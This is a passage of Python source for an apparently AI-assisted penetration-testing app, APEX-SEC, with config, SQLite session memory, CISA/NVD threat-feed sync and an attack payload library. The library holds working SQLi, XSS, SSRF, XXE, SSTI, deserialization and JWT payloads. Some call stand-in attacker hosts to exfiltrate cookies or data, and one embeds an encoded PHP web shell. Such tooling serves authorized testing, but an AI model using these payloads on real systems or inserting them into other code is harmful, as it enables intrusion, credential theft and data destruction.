"""
APEX-SEC - Advanced Cyber Operations Engine
============================================

A production-grade, AI-powered security operations framework for authorized
penetration testing, red team operations, blue team analysis, API security
assessment, IoT testing, and educational security research.

Powered by local Ollama models (Llama 3 optimized) for 100% on-premises
execution, ensuring complete data privacy for sensitive engagements.

Author  : APEX-SEC Research Team
License : MIT
Version : 1.0.0
Python  : 3.10+

--------------------------------------------------------------------------------
LEGAL NOTICE
--------------------------------------------------------------------------------
This tool is provided strictly for AUTHORIZED security testing and educational
purposes. Users must obtain explicit written permission before testing any
system they do not own. Unauthorized use is illegal and unethical. The authors
assume no liability for misuse.

--------------------------------------------------------------------------------
ARCHITECTURE
--------------------------------------------------------------------------------
  Layer 1 - Foundation   : Config, Logging, Constants
  Layer 2 - Persistence  : SQLite Memory, Config Store, Evidence Vault
  Layer 3 - Domain       : Vulnerabilities, Payloads, Threat Intel
  Layer 4 - Intelligence : Personas, Prompt Engineering, LLM Bridge
  Layer 5 - Interface    : Streamlit UI, Tabs, Tools, Report Engine
  Layer 6 - Utilities    : Encoders, Hashers, Screenshot/Clipboard Handling
"""

from __future__ import annotations

import base64
import hashlib
import io
import json
import logging
import os
import sqlite3
import sys
import time
import uuid
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import quote, unquote

import requests
import streamlit as st

try:
    from langchain_community.llms import Ollama
except ImportError:
    Ollama = None  # Graceful degradation if LangChain missing

# =========================================================================
# SECTION 1 - GLOBAL CONSTANTS
# =========================================================================

APP_NAME: str = "APEX-SEC"
APP_VERSION: str = "1.0.0"
APP_TAGLINE: str = "Advanced Cyber Operations Engine"

CONFIG_DIR: Path = Path("config")
CONFIG_DIR.mkdir(exist_ok=True)

EVIDENCE_DIR: Path = CONFIG_DIR / "evidence"
EVIDENCE_DIR.mkdir(exist_ok=True)

DB_PATH: Path = CONFIG_DIR / "apex_memory.db"
KB_FILE: Path = CONFIG_DIR / "threat_intel.json"
CONFIG_FILE: Path = CONFIG_DIR / "apex_config.json"
LOG_FILE: Path = CONFIG_DIR / "apex_sec.log"
PAYLOAD_DB: Path = CONFIG_DIR / "payload_library.json"
REPORTS_DIR: Path = CONFIG_DIR / "reports"
REPORTS_DIR.mkdir(exist_ok=True)

CISA_FEED_URL: str = (
    "https://www.cisa.gov/sites/default/files/feeds/"
    "known_exploited_vulnerabilities.json"
)
NVD_API_URL: str = "https://services.nvd.nist.gov/rest/json/cves/2.0"

HTTP_TIMEOUT: int = 20
MAX_RETRIES: int = 3
BACKOFF_BASE: float = 2.0

# =========================================================================
# SECTION 2 - LOGGING FOUNDATION
# =========================================================================

def _configure_logging() -> logging.Logger:
    logger = logging.getLogger(APP_NAME)
    if logger.handlers:
        return logger

    logger.setLevel(logging.INFO)
    formatter = logging.Formatter(
        fmt="%(asctime)s | %(levelname)-7s | %(name)s | %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )

    try:
        fh = logging.FileHandler(LOG_FILE, encoding="utf-8")
        fh.setFormatter(formatter)
        logger.addHandler(fh)
    except (IOError, OSError):
        pass

    sh = logging.StreamHandler(sys.stdout)
    sh.setFormatter(formatter)
    logger.addHandler(sh)

    return logger


logger: logging.Logger = _configure_logging()

# =========================================================================
# SECTION 3 - UTILITY HELPERS
# =========================================================================

def _utcnow() -> str:
    """Return current UTC time in ISO-8601 format."""
    return datetime.now(timezone.utc).isoformat()


def _safe_filename(name: str) -> str:
    """Sanitize a string for safe filesystem usage."""
    return "".join(c if c.isalnum() or c in "-_." else "_" for c in name)[:100]


def _human_size(num_bytes: int) -> str:
    """Convert byte count to human-readable string."""
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if num_bytes < 1024.0:
            return f"{num_bytes:.1f} {unit}"
        num_bytes /= 1024.0
    return f"{num_bytes:.1f} PB"


# =========================================================================
# SECTION 4 - DOMAIN MODELS
# =========================================================================

@dataclass
class VulnerabilityEntry:
    """Represents a single tracked vulnerability."""
    cve_id: str
    severity: str
    title: str = ""
    description: str = ""
    mitigation: str = ""
    cvss_score: float = 0.0
    cvss_vector: str = ""
    impact: str = ""
    references: List[str] = field(default_factory=list)
    evidence_paths: List[str] = field(default_factory=list)
    tools_used: List[str] = field(default_factory=list)
    steps_to_reproduce: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=_utcnow)


@dataclass
class PayloadEntry:
    """Represents a reusable payload template."""
    name: str
    category: str
    payload: str
    target: str = ""
    notes: str = ""
    severity: str = "medium"
    tags: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=_utcnow)


@dataclass
class TargetProfile:
    """Represents the active engagement target."""
    ip_address: str = "192.168.1.1"
    hostname: str = ""
    os_info: str = "Unknown"
    mac_address: str = "Unknown"
    environment: str = "lab"
    scope_notes: str = ""
    organization: str = ""
    timestamp: str = field(default_factory=_utcnow)


@dataclass
class EvidenceItem:
    """Represents a screenshot or artifact attached as evidence."""
    evidence_id: str
    filename: str
    filepath: str
    mime_type: str
    size_bytes: int
    caption: str = ""
    linked_cve: str = ""
    timestamp: str = field(default_factory=_utcnow)


# =========================================================================
# SECTION 5 - CONFIGURATION MANAGER
# =========================================================================

class ConfigManager:
    """Thread-safe persistent configuration store."""

    DEFAULTS: Dict[str, Any] = {
        "model": "llama3",
        "temperature": 0.3,
        "top_p": 0.9,
        "num_predict": 2048,
        "context_messages": 30,
        "persona": "apex-sec",
        "allow_payload_gen": True,
        "custom_prompt": "",
        "theme": "dark",
        "auto_sync_intel": True,
        "sync_interval_hours": 6,
        "lab_mode": True,
        "report_author": "Security Researcher",
        "report_org": "Independent",
    }

    def __init__(self, path: Path = CONFIG_FILE) -> None:
        self._path = path
        self._config: Dict[str, Any] = dict(self.DEFAULTS)
        self._load()

    def _load(self) -> None:
        if not self._path.exists():
            self._save()
            return
        try:
            with open(self._path, "r", encoding="utf-8") as fh:
                data = json.load(fh)
            if isinstance(data, dict):
                for key, value in data.items():
                    if key in self.DEFAULTS:
                        self._config[key] = value
        except (json.JSONDecodeError, IOError, OSError) as exc:
            logger.warning("Config load failed: %s", exc)

    def _save(self) -> None:
        try:
            with open(self._path, "w", encoding="utf-8") as fh:
                json.dump(self._config, fh, indent=2, ensure_ascii=False)
        except (IOError, OSError) as exc:
            logger.error("Config save failed: %s", exc)

    def get(self, key: str, default: Any = None) -> Any:
        if default is None:
            return self._config.get(key, self.DEFAULTS.get(key))
        return self._config.get(key, default)

    def set(self, key: str, value: Any) -> bool:
        if self._config.get(key) == value:
            return False
        self._config[key] = value
        self._save()
        return True

    def update(self, values: Dict[str, Any]) -> bool:
        changed = False
        for key, value in values.items():
            if self._config.get(key) != value:
                self._config[key] = value
                changed = True
        if changed:
            self._save()
        return changed

    def as_dict(self) -> Dict[str, Any]:
        return dict(self._config)

    def reset(self) -> None:
        self._config = dict(self.DEFAULTS)
        self._save()


# =========================================================================
# SECTION 6 - PERSISTENT MEMORY (SQLite)
# =========================================================================

class MemoryManager:
    """SQLite-backed conversation memory scaling to millions of messages."""

    _SCHEMA_SESSIONS = """
        CREATE TABLE IF NOT EXISTS sessions (
            session_id  TEXT PRIMARY KEY,
            title       TEXT NOT NULL,
            created_at  TEXT NOT NULL,
            updated_at  TEXT NOT NULL
        )
    """

    _SCHEMA_MESSAGES = """
        CREATE TABLE IF NOT EXISTS messages (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id  TEXT NOT NULL,
            role        TEXT NOT NULL,
            content     TEXT NOT NULL,
            meta        TEXT,
            created_at  TEXT NOT NULL,
            FOREIGN KEY (session_id) REFERENCES sessions(session_id)
                ON DELETE CASCADE
        )
    """

    _SCHEMA_EVIDENCE = """
        CREATE TABLE IF NOT EXISTS evidence (
            evidence_id TEXT PRIMARY KEY,
            session_id  TEXT NOT NULL,
            filename    TEXT NOT NULL,
            filepath    TEXT NOT NULL,
            mime_type   TEXT NOT NULL,
            size_bytes  INTEGER NOT NULL,
            caption     TEXT,
            linked_cve  TEXT,
            created_at  TEXT NOT NULL,
            FOREIGN KEY (session_id) REFERENCES sessions(session_id)
                ON DELETE CASCADE
        )
    """

    _SCHEMA_INDEXES = [
        "CREATE INDEX IF NOT EXISTS idx_messages_session ON messages(session_id, id)",
        "CREATE INDEX IF NOT EXISTS idx_evidence_session ON evidence(session_id)",
    ]

    def __init__(self, db_path: Path = DB_PATH) -> None:
        self._db_path = str(db_path)
        self._init_schema()

    def _connect(self) -> sqlite3.Connection:
        conn = sqlite3.connect(self._db_path, check_same_thread=False)
        conn.row_factory = sqlite3.Row
        conn.execute("PRAGMA foreign_keys = ON")
        return conn

    def _init_schema(self) -> None:
        try:
            with self._connect() as conn:
                conn.execute(self._SCHEMA_SESSIONS)
                conn.execute(self._SCHEMA_MESSAGES)
                conn.execute(self._SCHEMA_EVIDENCE)
                for idx in self._SCHEMA_INDEXES:
                    conn.execute(idx)
                conn.commit()
        except sqlite3.Error as exc:
            logger.error("Memory schema init failed: %s", exc)

    # -- Sessions ------------------------------------------------------
    def create_session(self, title: str = "New Session",
                       session_id: Optional[str] = None) -> str:
        sid = session_id or str(uuid.uuid4())
        now = _utcnow()
        try:
            with self._connect() as conn:
                conn.execute(
                    "INSERT OR IGNORE INTO sessions VALUES (?, ?, ?, ?)",
                    (sid, title, now, now),
                )
                conn.commit()
        except sqlite3.Error as exc:
            logger.error("Session create failed: %s", exc)
        return sid

    def list_sessions(self) -> List[Dict[str, Any]]:
        try:
            with self._connect() as conn:
                rows = conn.execute(
                    "SELECT * FROM sessions ORDER BY updated_at DESC"
                ).fetchall()
            return [dict(r) for r in rows]
        except sqlite3.Error:
            return []

    def rename_session(self, session_id: str, title: str) -> None:
        try:
            with self._connect() as conn:
                conn.execute(
                    "UPDATE sessions SET title = ?, updated_at = ? WHERE session_id = ?",
                    (title, _utcnow(), session_id),
                )
                conn.commit()
        except sqlite3.Error as exc:
            logger.error("Session rename failed: %s", exc)

    def delete_session(self, session_id: str) -> None:
        try:
            with self._connect() as conn:
                conn.execute("DELETE FROM messages WHERE session_id = ?", (session_id,))
                conn.execute("DELETE FROM evidence WHERE session_id = ?", (session_id,))
                conn.execute("DELETE FROM sessions WHERE session_id = ?", (session_id,))
                conn.commit()
        except sqlite3.Error as exc:
            logger.error("Session delete failed: %s", exc)

    # -- Messages ------------------------------------------------------
    def add_message(self, session_id: str, role: str, content: str,
                    meta: Optional[Dict[str, Any]] = None) -> None:
        now = _utcnow()
        try:
            with self._connect() as conn:
                conn.execute(
                    "INSERT INTO messages (session_id, role, content, meta, created_at) "
                    "VALUES (?, ?, ?, ?, ?)",
                    (session_id, role, content, json.dumps(meta or {}), now),
                )
                conn.execute(
                    "UPDATE sessions SET updated_at = ? WHERE session_id = ?",
                    (now, session_id),
                )
                conn.commit()
        except sqlite3.Error as exc:
            logger.error("Message add failed: %s", exc)

    def get_messages(self, session_id: str,
                     limit: Optional[int] = None) -> List[Dict[str, Any]]:
        try:
            with self._connect() as conn:
                if limit:
                    rows = conn.execute(
                        "SELECT * FROM ("
                        "  SELECT * FROM messages WHERE session_id = ? "
                        "  ORDER BY id DESC LIMIT ?"
                        ") ORDER BY id ASC",
                        (session_id, limit),
                    ).fetchall()
                else:
                    rows = conn.execute(
                        "SELECT * FROM messages WHERE session_id = ? ORDER BY id ASC",
                        (session_id,),
                    ).fetchall()
            return [dict(r) for r in rows]
        except sqlite3.Error as exc:
            logger.error("Message fetch failed: %s", exc)
            return []

    def count_messages(self, session_id: str) -> int:
        try:
            with self._connect() as conn:
                row = conn.execute(
                    "SELECT COUNT(*) AS c FROM messages WHERE session_id = ?",
                    (session_id,),
                ).fetchone()
            return int(row["c"]) if row else 0
        except sqlite3.Error:
            return 0

    def build_context(self, session_id: str, last_n: int = 30) -> str:
        msgs = self.get_messages(session_id, limit=last_n)
        return "\n\n".join(f"{m['role'].upper()}: {m['content']}" for m in msgs)

    # -- Evidence ------------------------------------------------------
    def add_evidence(self, session_id: str, filename: str, filepath: str,
                     mime_type: str, size_bytes: int,
                     caption: str = "", linked_cve: str = "") -> str:
        eid = str(uuid.uuid4())
        try:
            with self._connect() as conn:
                conn.execute(
                    "INSERT INTO evidence VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    (eid, session_id, filename, filepath, mime_type,
                     size_bytes, caption, linked_cve, _utcnow()),
                )
                conn.commit()
        except sqlite3.Error as exc:
            logger.error("Evidence add failed: %s", exc)
        return eid

    def list_evidence(self, session_id: str) -> List[Dict[str, Any]]:
        try:
            with self._connect() as conn:
                rows = conn.execute(
                    "SELECT * FROM evidence WHERE session_id = ? ORDER BY created_at ASC",
                    (session_id,),
                ).fetchall()
            return [dict(r) for r in rows]
        except sqlite3.Error:
            return []

    def delete_evidence(self, evidence_id: str) -> None:
        try:
            with self._connect() as conn:
                conn.execute("DELETE FROM evidence WHERE evidence_id = ?", (evidence_id,))
                conn.commit()
        except sqlite3.Error as exc:
            logger.error("Evidence delete failed: %s", exc)

    def clear_all(self) -> None:
        try:
            with self._connect() as conn:
                conn.execute("DELETE FROM messages")
                conn.execute("DELETE FROM evidence")
                conn.execute("DELETE FROM sessions")
                conn.commit()
        except sqlite3.Error as exc:
            logger.error("Clear all failed: %s", exc)


# =========================================================================
# SECTION 7 - VULNERABILITY TRACKER
# =========================================================================

class VulnerabilityTracker:
    """Tracks discovered vulnerabilities for the active engagement."""

    def __init__(self, system_id: str = "TARGET-ASSET-01") -> None:
        self.system_id = system_id
        self.knowledge_base: List[VulnerabilityEntry] = []
        self.target: TargetProfile = TargetProfile()

    def set_target(self, profile: TargetProfile) -> None:
        self.target = profile

    def add(self, entry: VulnerabilityEntry) -> None:
        self.knowledge_base.append(entry)
        logger.info("Vulnerability tracked: %s (%s)", entry.cve_id, entry.severity)

    def remove(self, cve_id: str) -> bool:
        before = len(self.knowledge_base)
        self.knowledge_base = [v for v in self.knowledge_base if v.cve_id != cve_id]
        return len(self.knowledge_base) < before

    def summary(self) -> Dict[str, int]:
        counts: Dict[str, int] = {}
        for v in self.knowledge_base:
            counts[v.severity] = counts.get(v.severity, 0) + 1
        return counts

    def export_report(self) -> str:
        report = {
            "system_id": self.system_id,
            "target": asdict(self.target),
            "vulnerabilities": [asdict(v) for v in self.knowledge_base],
            "summary": self.summary(),
            "export_timestamp": _utcnow(),
        }
        return json.dumps(report, indent=4, ensure_ascii=False)


# =========================================================================
# END OF PART 1
# =========================================================================
# =========================================================================
# SECTION 8 - PAYLOAD LIBRARY (Extended, 12 Categories)
# =========================================================================

class PayloadLibrary:
    """
    Central repository of payload templates for authorized lab testing.

    Every payload is categorized, tagged, and documented with usage notes.
    This library is designed for penetration testers to quickly reference
    proven techniques during sanctioned engagements.
    """

    CATEGORIES: Dict[str, List[Dict[str, Any]]] = {
        "sqli": [
            {"name": "Classic Auth Bypass",
             "payload": "' OR '1'='1' -- -",
             "notes": "Classic OR-based login bypass",
             "severity": "critical",
             "tags": ["auth-bypass", "login"]},
            {"name": "Union-Based Extraction",
             "payload": "' UNION SELECT NULL,username,password FROM users-- -",
             "notes": "UNION-based column extraction",
             "severity": "critical",
             "tags": ["union", "extraction"]},
            {"name": "MySQL Time-Based Blind",
             "payload": "' OR IF(1=1,SLEEP(5),0)-- -",
             "notes": "MySQL time-based blind injection",
             "severity": "high",
             "tags": ["blind", "mysql", "time"]},
            {"name": "PostgreSQL Stacked",
             "payload": "'; DROP TABLE users; --",
             "notes": "PostgreSQL stacked queries",
             "severity": "critical",
             "tags": ["postgres", "stacked"]},
            {"name": "MSSQL Error-Based",
             "payload": "' AND 1=CONVERT(int,(SELECT @@version))--",
             "notes": "MSSQL error-based extraction",
             "severity": "high",
             "tags": ["mssql", "error"]},
            {"name": "Boolean Blind",
             "payload": "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--",
             "notes": "Boolean-based blind extraction",
             "severity": "high",
             "tags": ["blind", "boolean"]},
        ],
        "xss": [
            {"name": "Basic Alert",
             "payload": "<script>alert(1)</script>",
             "notes": "Simple reflected XSS proof",
             "severity": "medium",
             "tags": ["reflected", "basic"]},
            {"name": "IMG OnError",
             "payload": "<img src=x onerror=alert(1)>",
             "notes": "Attribute-based XSS",
             "severity": "medium",
             "tags": ["img", "attribute"]},
            {"name": "SVG OnLoad",
             "payload": "<svg onload=alert(document.domain)>",
             "notes": "SVG-based XSS",
             "severity": "medium",
             "tags": ["svg", "onload"]},
            {"name": "Cookie Stealer",
             "payload": "<script>new Image().src='https://attacker.tld/c?'+document.cookie</script>",
             "notes": "Session cookie exfiltration",
             "severity": "high",
             "tags": ["cookie", "exfil"]},
            {"name": "DOM XSS via hash",
             "payload": "#<img src=x onerror=alert(1)>",
             "notes": "DOM-based via URL fragment",
             "severity": "medium",
             "tags": ["dom", "hash"]},
        ],
        "ssrf": [
            {"name": "Localhost Probe",
             "payload": "http://127.0.0.1:80/",
             "notes": "Internal loopback probe",
             "severity": "high",
             "tags": ["localhost", "internal"]},
            {"name": "AWS Metadata",
             "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
             "notes": "AWS IMDS credential extraction",
             "severity": "critical",
             "tags": ["aws", "imds", "cloud"]},
            {"name": "GCP Metadata",
             "payload": "http://metadata.google.internal/computeMetadata/v1/",
             "notes": "GCP metadata service",
             "severity": "critical",
             "tags": ["gcp", "cloud"]},
            {"name": "Azure Metadata",
             "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
             "notes": "Azure IMDS",
             "severity": "critical",
             "tags": ["azure", "cloud"]},
            {"name": "File URI",
             "payload": "file:///etc/passwd",
             "notes": "Local file disclosure via SSRF",
             "severity": "high",
             "tags": ["file", "lfi"]},
            {"name": "Gopher Smuggling",
             "payload": "gopher://127.0.0.1:6379/_INFO",
             "notes": "Redis attack via gopher",
             "severity": "critical",
             "tags": ["gopher", "redis"]},
        ],
        "csrf": [
            {"name": "Form Auto-Submit",
             "payload": "<form action='https://target.tld/change' method='POST'><input name='email' value='attacker@evil.tld'><script>document.forms[0].submit()</script></form>",
             "notes": "Auto-submitting CSRF form",
             "severity": "high",
             "tags": ["form", "auto"]},
            {"name": "JSON CSRF",
             "payload": "fetch('https://target.tld/api/change',{method:'POST',credentials:'include',headers:{'Content-Type':'text/plain'},body:'{\"email\":\"attacker@evil.tld\"}'})",
             "notes": "CSRF bypassing JSON content-type check",
             "severity": "high",
             "tags": ["json", "fetch"]},
        ],
        "lfi": [
            {"name": "Linux Passwd",
             "payload": "../../../../etc/passwd",
             "notes": "Linux LFI - passwd read",
             "severity": "high",
             "tags": ["linux", "passwd"]},
            {"name": "Windows Win.ini",
             "payload": "..\\..\\..\\..\\windows\\win.ini",
             "notes": "Windows LFI",
             "severity": "high",
             "tags": ["windows"]},
            {"name": "PHP Filter Chain",
             "payload": "php://filter/convert.base64-encode/resource=index.php",
             "notes": "PHP filter for source disclosure",
             "severity": "high",
             "tags": ["php", "filter"]},
            {"name": "PHP Data Wrapper",
             "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
             "notes": "PHP data:// RCE wrapper",
             "severity": "critical",
             "tags": ["php", "data", "rce"]},
            {"name": "Log Poisoning",
             "payload": "/var/log/apache2/access.log",
             "notes": "LFI to log poisoning chain",
             "severity": "critical",
             "tags": ["log", "poison"]},
        ],
        "rce": [
            {"name": "Semicolon Command",
             "payload": "; id",
             "notes": "Command separator injection",
             "severity": "critical",
             "tags": ["cmd", "sep"]},
            {"name": "Backtick Execution",
             "payload": "`whoami`",
             "notes": "Backtick command injection",
             "severity": "critical",
             "tags": ["backtick"]},
            {"name": "Pipe Command",
             "payload": "| cat /etc/passwd",
             "notes": "Pipe command injection",
             "severity": "critical",
             "tags": ["pipe"]},
            {"name": "Blind Time-Based",
             "payload": "; sleep 5",
             "notes": "Blind command injection detection",
             "severity": "high",
             "tags": ["blind", "sleep"]},
            {"name": "OOB via DNS",
             "payload": "; nslookup $(whoami).attacker.tld",
             "notes": "Out-of-band data exfil",
             "severity": "critical",
             "tags": ["oob", "dns"]},
        ],
        "xxe": [
            {"name": "Classic File Read",
             "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
             "notes": "Standard XXE file read",
             "severity": "high",
             "tags": ["file", "classic"]},
            {"name": "SSRF via XXE",
             "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://169.254.169.254/\">]><r>&x;</r>",
             "notes": "XXE to SSRF chain",
             "severity": "critical",
             "tags": ["ssrf", "cloud"]},
            {"name": "Blind OOB",
             "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://attacker.tld/dtd\">%p;]>",
             "notes": "Blind out-of-band XXE",
             "severity": "high",
             "tags": ["blind", "oob"]},
            {"name": "Billion Laughs",
             "payload": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;\">]><lolz>&lol2;</lolz>",
             "notes": "DoS via entity expansion",
             "severity": "medium",
             "tags": ["dos", "billion"]},
        ],
        "ssti": [
            {"name": "Jinja2 Probe",
             "payload": "{{7*7}}",
             "notes": "Template engine probe",
             "severity": "medium",
             "tags": ["probe", "jinja2"]},
            {"name": "Jinja2 RCE",
             "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
             "notes": "Jinja2 RCE chain",
             "severity": "critical",
             "tags": ["jinja2", "rce"]},
            {"name": "Twig RCE",
             "payload": "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
             "notes": "Twig template RCE",
             "severity": "critical",
             "tags": ["twig", "rce"]},
            {"name": "Freemarker RCE",
             "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
             "notes": "Freemarker RCE",
             "severity": "critical",
             "tags": ["freemarker", "rce"]},
        ],
        "jwt": [
            {"name": "Alg None Attack",
             "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
             "notes": "JWT with 'none' algorithm",
             "severity": "critical",
             "tags": ["jwt", "none"]},
            {"name": "Weak Secret Cracking",
             "payload": "hashcat -m 16500 jwt.txt wordlist.txt",
             "notes": "JWT secret cracking command",
             "severity": "high",
             "tags": ["jwt", "crack"]},
            {"name": "Kid Path Traversal",
             "payload": "{\"alg\":\"HS256\",\"kid\":\"../../dev/null\"}",
             "notes": "JWT kid header path traversal",
             "severity": "critical",
             "tags": ["jwt", "kid"]},
        ],
        "deserialization": [
            {"name": "Java Commons RCE",
             "payload": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//wAAAQAAcHQAB2V4YW1wbGV0AA9waHAuZ2V0cGFyYW1zKCk=",
             "notes": "Java CommonsCollections deserialization",
             "severity": "critical",
             "tags": ["java", "commons"]},
            {"name": "Python Pickle RCE",
             "payload": "cos\\nsystem\\n(S'id'\\ntR.",
             "notes": "Python pickle RCE payload",
             "severity": "critical",
             "tags": ["python", "pickle"]},
        ],
        "oauth": [
            {"name": "Redirect URI Bypass",
             "payload": "https://legit.tld/callback?redirect=https://attacker.tld",
             "notes": "Open redirect in OAuth flow",
             "severity": "critical",
             "tags": ["oauth", "redirect"]},
            {"name": "State CSRF",
             "payload": "Remove state parameter from OAuth authorization request",
             "notes": "Missing state = CSRF on OAuth",
             "severity": "high",
             "tags": ["oauth", "csrf"]},
            {"name": "PKCE Downgrade",
             "payload": "Remove code_challenge from request",
             "notes": "PKCE bypass attempt",
             "severity": "high",
             "tags": ["oauth", "pkce"]},
        ],
    }

    @classmethod
    def categories(cls) -> List[str]:
        return list(cls.CATEGORIES.keys())

    @classmethod
    def get(cls, category: str) -> List[Dict[str, Any]]:
        return cls.CATEGORIES.get(category.lower(), [])

    @classmethod
    def all_payloads(cls) -> List[Dict[str, Any]]:
        results: List[Dict[str, Any]] = []
        for cat, items in cls.CATEGORIES.items():
            for item in items:
                results.append({**item, "category": cat})
        return results

    @classmethod
    def search(cls, keyword: str) -> List[Dict[str, Any]]:
        keyword = keyword.strip().lower()
        if not keyword:
            return []
        results: List[Dict[str, Any]] = []
        for cat, items in cls.CATEGORIES.items():
            for item in items:
                blob = (
                    item.get("name", "") + " " +
                    item.get("payload", "") + " " +
                    item.get("notes", "") + " " +
                    " ".join(item.get("tags", []))
                ).lower()
                if keyword in blob:
                    results.append({**item, "category": cat})
        return results

    @classmethod
    def count(cls) -> int:
        return sum(len(v) for v in cls.CATEGORIES.values())


# =========================================================================
# SECTION 9 - THREAT INTELLIGENCE (CISA + NVD)
# =========================================================================

@st.cache_data(ttl=3600, show_spinner=False)
def load_threat_intel() -> List[Dict[str, Any]]:
    """Load cached threat intelligence from disk."""
    if not KB_FILE.exists():
        return []
    try:
        with open(KB_FILE, "r", encoding="utf-8") as fh:
            data = json.load(fh)
        if isinstance(data, dict) and "vulnerabilities" in data:
            return data["vulnerabilities"]
        if isinstance(data, list):
            return data
        return []
    except (json.JSONDecodeError, IOError) as exc:
        logger.warning("Threat intel load failed: %s", exc)
        return []


def _http_get_with_retry(url: str, headers: Optional[Dict[str, str]] = None,
                         max_retries: int = MAX_RETRIES) -> Optional[requests.Response]:
    """HTTP GET with exponential backoff retry logic."""
    _headers = headers or {"User-Agent": f"{APP_NAME}/{APP_VERSION}"}
    last_error = ""

    for attempt in range(1, max_retries + 1):
        try:
            response = requests.get(url, timeout=HTTP_TIMEOUT, headers=_headers)
            if response.status_code == 200:
                return response
            last_error = f"HTTP {response.status_code}"
        except requests.exceptions.Timeout:
            last_error = "Timeout"
        except requests.exceptions.ConnectionError:
            last_error = "Connection error"
        except requests.exceptions.RequestException as exc:
            last_error = str(exc)

        if attempt < max_retries:
            sleep_time = BACKOFF_BASE ** attempt
            logger.warning("Retry %d/%d in %.1fs (%s)",
                           attempt, max_retries, sleep_time, last_error)
            time.sleep(sleep_time)

    logger.error("HTTP GET failed after %d attempts: %s", max_retries, last_error)
    return None


def sync_cisa_feed() -> Tuple[bool, str]:
    """Synchronize CISA Known Exploited Vulnerabilities feed."""
    response = _http_get_with_retry(CISA_FEED_URL)
    if not response:
        return False, "CISA sync failed - network error"

    try:
        data = response.json().get("vulnerabilities", [])[:500]
        if not data:
            return False, "Empty feed received"

        existing = load_threat_intel()
        existing_ids = {item.get("cveID") for item in existing if item.get("cveID")}

        new_items = []
        for item in data:
            if item.get("cveID") and item["cveID"] not in existing_ids:
                item["source"] = "CISA-KEV"
                new_items.append(item)

        merged = new_items + existing
        merged = merged[:1000]

        with open(KB_FILE, "w", encoding="utf-8") as fh:
            json.dump({"vulnerabilities": merged, "last_sync": _utcnow()},
                      fh, indent=2, ensure_ascii=False)

        load_threat_intel.clear()
        logger.info("CISA sync: %d new entries", len(new_items))
        return True, f"Synced {len(new_items)} new entries ({len(merged)} total)"

    except (json.JSONDecodeError, KeyError) as exc:
        logger.error("CISA parse error: %s", exc)
        return False, f"Parse error: {exc}"


def fetch_nvd_cve(cve_id: str) -> Optional[Dict[str, Any]]:
    """Fetch a single CVE from NVD API."""
    if not cve_id.upper().startswith("CVE-"):
        return None

    url = f"{NVD_API_URL}?cveId={cve_id.upper()}"
    response = _http_get_with_retry(url, max_retries=2)
    if not response:
        return None

    try:
        data = response.json()
        vulns = data.get("vulnerabilities", [])
        if not vulns:
            return None
        cve_data = vulns[0].get("cve", {})
        metrics = cve_data.get("metrics", {})

        cvss_score = 0.0
        cvss_vector = ""
        for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
            if key in metrics and metrics[key]:
                entry = metrics[key][0]
                cvss_data = entry.get("cvssData", {})
                cvss_score = cvss_data.get("baseScore", 0.0)
                cvss_vector = cvss_data.get("vectorString", "")
                break

        descriptions = cve_data.get("descriptions", [])
        description = next(
            (d.get("value", "") for d in descriptions if d.get("lang") == "en"),
            ""
        )

        return {
            "cve_id": cve_id.upper(),
            "description": description,
            "cvss_score": cvss_score,
            "cvss_vector": cvss_vector,
            "published": cve_data.get("published", ""),
            "last_modified": cve_data.get("lastModified", ""),
        }
    except (json.JSONDecodeError, KeyError, IndexError) as exc:
        logger.error("NVD parse error for %s: %s", cve_id, exc)
        return None


def search_threat_intel(keyword: str, limit: int = 50) -> List[Dict[str, Any]]:
    """Search cached threat intelligence."""
    keyword = keyword.strip().lower()
    if not keyword:
        return []
    results = []
    for item in load_threat_intel():
        blob = (
            item.get("cveID", "") + " " +
            item.get("vulnerabilityName", "") + " " +
            item.get("shortDescription", "") + " " +
            item.get("vendorProject", "") + " " +
            item.get("product", "")
        ).lower()
        if keyword in blob:
            results.append(item)
        if len(results) >= limit:
            break
    return results


# =========================================================================
# SECTION 10 - API TESTING MODULE
# =========================================================================

class APITester:
    """
    REST/GraphQL API testing helper.

    Generates ready-to-run testing commands and payloads for common
    API vulnerability classes without performing live requests itself.
    """

    @staticmethod
    def auth_bypass_checklists() -> List[str]:
        return [
            "Test endpoints without Authorization header",
            "Test with expired JWT tokens",
            "Test with tampered JWT payload (role escalation)",
            "Test HTTP method override (X-HTTP-Method-Override)",
            "Test API version downgrade (v1 vs v2 endpoints)",
            "Test forced browsing to admin endpoints",
